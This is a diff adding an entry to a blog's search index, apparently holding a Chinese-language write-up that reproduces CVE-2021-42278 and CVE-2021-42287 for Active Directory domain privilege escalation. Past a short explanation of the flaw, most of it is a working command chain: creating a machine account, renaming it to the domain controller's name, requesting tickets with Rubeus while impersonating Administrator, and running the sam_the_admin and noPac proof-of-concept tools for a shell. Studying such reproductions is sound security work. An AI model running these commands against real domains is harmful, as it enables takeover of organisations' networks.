@@ -984,4 +984,113 @@
         <tag>漏洞复现</tag>
       </tags>
   </entry>
+  <entry>
+    <title>CVE-2021-42278 &amp; CVE-2021-42287 域提权</title>
+    <url>/2021/12/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CVE-2021-42278_CVE-2021-42287%E5%9F%9F%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="CVE-2021-42278"><a href="#CVE-2021-42278" class="headerlink" title="CVE-2021-42278"></a><code>CVE-2021-42278</code></h3><p> 一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
+<h3 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a><code>CVE-2021-42287</code></h3><p> 结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><p>首先需要一个域内用户，然后提权至域管，接管域控。步骤如下</p>
+<ol>
+<li> 创建一个机器账户</li>
+<li> 清除机器账户的<code>SPN</code></li>
+<li> 修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 使用机器账户请求<code>TGT</code></li>
+<li> 再次修改机器账户的<code>sAMAccountName</code>属性值</li>
+<li> 获取高权限<code>ST</code>票据</li>
+</ol>
+<ul>
+<li><h3 id="1-创建机器用户"><a href="#1-创建机器用户" class="headerlink" title="1.创建机器用户"></a>1.创建机器用户</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a>  创建一个新的机器账户， <code>syyu$</code></p>
+<p>  当申请一个机器账户<code>MachineCount</code>时，<code>SPN</code>会自动注册</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> syyu <span class="literal">-Domain</span> hacker.me <span class="literal">-DomainController</span> dc.hacker.me <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="2-清除SPN"><a href="#2-清除SPN" class="headerlink" title="2.清除SPN"></a>2.清除SPN</h3></li>
+</ul>
+<blockquote>
+<p>  使用 <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> 下的 <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a> 工具 ，进行清除 </p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-DomainObject</span> <span class="string">&quot;CN=syyu,CN=Computers,DC=hacker,DC=me&quot;</span> <span class="literal">-Clear</span> <span class="string">&#x27;serviceprincipalname&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="3-修改sAMAccountName属性"><a href="#3-修改sAMAccountName属性" class="headerlink" title="3.修改sAMAccountName属性"></a>3.修改sAMAccountName属性</h3></li>
+</ul>
+<blockquote>
+<p>   将 <strong>sAMAccountName</strong> 改为域控的机器账号名</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp  // 查询 域控的主机名</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> // sAMAccountName 改为域控的机器账号名</span><br><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;dc&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="4-请求TGT"><a href="#4-请求TGT" class="headerlink" title="4.请求TGT"></a>4.请求TGT</h3></li>
+</ul>
+<blockquote>
+<p>  使用更改后的机器名申请TGT票据，利用 <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> 完成请求</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:dc /password:p@ssWord /domain:hacker.me /dc:dc.hacker.me /nowrap</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="5-再次修改sAMAccountName属性值"><a href="#5-再次修改sAMAccountName属性值" class="headerlink" title="5.再次修改sAMAccountName属性值"></a>5.再次修改sAMAccountName属性值</h3></li>
+</ul>
+<blockquote>
+<p>  <code>samaccountname</code>重置会原本的用户名或改为其他域内不存在账户</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount syyu -Value &quot;syyu$&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="6-获取高权限ST票据"><a href="#6-获取高权限ST票据" class="headerlink" title="6.获取高权限ST票据"></a>6.获取高权限ST票据</h3></li>
+</ul>
+<blockquote>
+<p>  在采用刚刚获取到的<code>TGT</code>进行<code>S4U2self</code>请求来获取域控<code>ST</code>票据（这个过程<code>KDC</code>会去查找<code>samaccountname</code>，由于刚才<code>MachineCount</code>的<code>samaccountname</code>为<code>dc</code>，所以<code>KDC</code>回去查找这个<code>dc</code>，此时由于已经将<code>MachineCount</code>的<code>samaccountname</code>所更改，<code>KDC</code>查找不到<code>dc</code>就会在后面加上<code>$</code>符去寻找，此时找到的就为域控的<code>dc$</code>，并将它的<code>ST</code>票据返回）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT值]</span><br><span class="line"></span><br><span class="line">Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:&quot;CIFS/dc.hacker.me&quot; /dc:&quot;dc.hacker.me&quot; /ptt /ticket:[TGT]</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们便获取了<code>DC</code>的<code>ST</code>票据</p>
+<h2 id="poc使用"><a href="#poc使用" class="headerlink" title="poc使用"></a>poc使用</h2><h3 id="sam-the-admin"><a href="#sam-the-admin" class="headerlink" title="sam_the_admin"></a>sam_the_admin</h3><blockquote>
+<p>  <a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;god/liukaifeng01:hongrisec@2021@&quot;</span> -dc-ip 192.168.52.138 -shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="noPac-python"><a href="#noPac-python" class="headerlink" title="noPac_python"></a>noPac_python</h3><blockquote>
+<p>  <a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install impacket</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 noPac.py redteam/saul:<span class="string">&#x27;admin!@#45&#x27;</span> -dc-ip 10.10.10.8 -dc-host owa -shell --impersonate administrator </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/FHLZLHQ/article/details/121964692">https://blog.csdn.net/FHLZLHQ/article/details/121964692</a></p>
+<p><a href="http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">http://www.m1sn0w.top/2021/12/17/CVE-2021-42278&amp;CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a></p>
+<p><a href="https://sairson.cn/index.php/archives/45/">https://sairson.cn/index.php/archives/45/</a></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p><a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p><a href="https://github.com/Ridter/noPac">https://github.com/Ridter/noPac</a></p>
+<p><a href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p><a href="https://github.com/ricardojba/Invoke-noPac">https://github.com/ricardojba/Invoke-noPac</a></p>
+<h2 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h2><p><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>漏洞复现</category>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>漏洞复现</tag>
+        <tag>域提权</tag>
+      </tags>
+  </entry>
 </search>
